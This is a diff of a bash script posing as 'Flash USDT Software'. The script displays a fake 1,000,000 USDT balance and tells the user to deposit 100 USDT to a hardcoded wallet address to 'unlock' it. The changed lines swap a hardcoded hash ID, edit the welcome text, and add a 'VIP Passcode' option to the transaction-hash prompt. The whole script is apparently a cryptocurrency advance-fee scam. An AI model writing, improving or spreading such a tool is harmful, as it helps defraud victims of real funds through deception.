@@ -3,7 +3,7 @@
 # Wallet Command Line
 
 balance=1000000
-hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099"
+hash_id="forealid"
 account_id="TDUpZPXoLucrd3KcuRs1JMVsriFjfiVZn6"
 
 usdt_logo="
@@ -27,7 +27,7 @@ function fancyBoxEcho {
     echo -e "\e[38;2;38;161;123m$border\e[0m"
 }
 
-welcome_message="Welcome to the USDT Flash Software! Unlock your balance and enjoy the power of Flash USDT!"
+welcome_message="Welcome to the Flash USDT Software! Unlock your balance and enjoy the power of Flash USDT!"
 
 echo -e "$usdt_logo"
 
@@ -38,7 +38,7 @@ echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the
 function unlockBalance {
     echo " "
     read -p "Enter your deposit amount in USDT: " depositAmount
-    read -p "Enter the transaction hash ID: " transactionHash
+    read -p "Enter the transaction hash ID (or VIP Passcode): " transactionHash
 	
     echo " "
     for ((i=1; i<=15; i++)); do
